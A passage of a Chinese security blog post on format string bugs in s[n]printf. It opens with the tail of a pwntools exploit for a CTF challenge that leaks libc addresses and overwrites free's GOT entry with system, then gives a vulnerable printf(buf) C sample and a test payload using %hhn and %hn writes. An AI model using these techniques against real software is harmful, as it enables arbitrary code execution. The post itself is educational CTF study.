class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">program_base = leak - <span class="number">0xcf9</span></span><br><span class="line">log.success(<span class="string">&#x27;program_base = %#x&#x27;</span> % program_base)</span><br><span class="line"></span><br><span class="line">got_free = program_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libc_base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">to_write = system.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    write_byte_at(to_write[i], got_free + i)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<h2 id="更危险的另一个原因"><a href="#更危险的另一个原因" class="headerlink" title="更危险的另一个原因"></a>更危险的另一个原因</h2><p>实际上printf和s[n]printf在底层实现上就是不同的 s[n]printf直到上文实例中使用的代码的链接库版本glibc 2.40依然存在动态解析格式化字符串的功能 而同样的链接库版本编译出的程序printf都没有这样的功能</p>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>考虑以下代码编译出的程序:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">__int64_t</span> var1 = <span class="number">0</span>, var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">__int64_t</span> *ptr1 = &amp;var1, **ptr2 = &amp;ptr1;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;var1: %lx\nvar2: %lx\n&quot;</span>, var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送以下格式化字符串进行测试: <code>&quot;%88c%40$hhn%256c%38$hn&quot;</code> 其中%40$p为ptr2 %38$p为ptr1</p>
+<p>期望的行为是进行格式化输出后先是通过ptr2修改了ptr1 使其指向var2 然后通过ptr1向var2中写入数据</p>
+<p>但实际的结果是ptr1确实被修改为指向var2的指针 但被写入数据的依然是var1:</p>
+<p>执行前:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-220942.png" alt="image-20250309220942349"></p>
+<p>执行后:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-221210.png" alt="image-20250309221210187"></p>
+<p>可以看到在进行对ptr1的修改前就已经缓存了ptr1在执行前的值并在后续依然向那个保存值中写入数据</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>1K0CT B14s
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ikoct.com/2025/03/09/s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="s[n]printf的格式化字符串漏洞">https://ikoct.com/2025/03/09/s-n-printf的格式化字符串漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/" rel="prev" title="Linux中的虚拟文件">
+      <i class="fa fa-chevron-left"></i> Linux中的虚拟文件
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">s[n]printf的格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#s-n-printf%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">s[n]printf函数介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8F%AF%E8%83%BD%E6%80%A7"><span class="nav-number">1.2.</span> <span class="nav-text">更多格式化字符串漏洞的可能性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.3.</span> <span class="nav-text">实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%A8s-n-printf%E4%B8%AD%E8%A7%A3%E6%9E%90%E7%9A%84%E8%A7%84%E5%88%99"><span class="nav-number">1.3.1.</span> <span class="nav-text">格式化字符串在s[n]printf中解析的规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Easypwn"><span class="nav-number">1.3.2.</span> <span class="nav-text">[攻防世界] Easypwn</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E5%8D%B1%E9%99%A9%E7%9A%84%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.4.</span> <span class="nav-text">更危险的另一个原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">实例</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1K0CT B14s"
+      src="/images/myavatar.gif">
+  <p class="site-author-name" itemprop="name">1K0CT B14s</p>
+  <div class="site-description" itemprop="description">残りの人生、私にくれませんか？</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+-->
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1K0CT B14s</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">476k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">7:13</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
